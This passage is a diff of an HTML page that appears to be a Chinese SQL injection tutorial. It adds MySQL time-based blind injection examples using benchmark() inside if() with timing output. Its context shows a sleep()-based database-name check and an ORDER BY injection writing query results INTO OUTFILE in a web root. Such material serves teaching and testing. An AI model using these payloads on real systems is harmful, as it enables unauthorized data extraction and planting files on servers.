@@ -147,6 +147,13 @@ mysql&gt; select if((select database())=&quot;rtest&quot;,sleep(2),666);
 1 row in set (2.00 sec)
 </code></pre>
 
+<pre><code>mysql&gt; select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false);
+Empty set (2.18 sec)
+
+mysql&gt; mysql&gt; select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),false);
+Empty set (0.00 sec)
+</code></pre>
+
 <h3 id="0x01-注入点在order-by后面">0x01 注入点在Order by后面</h3>
 
 <pre><code>mysql&gt; select id,name,content from msg where id&gt;1 order by id into outfile 'C:\\Apps\\phpStudy\\WWW\\a.txt';
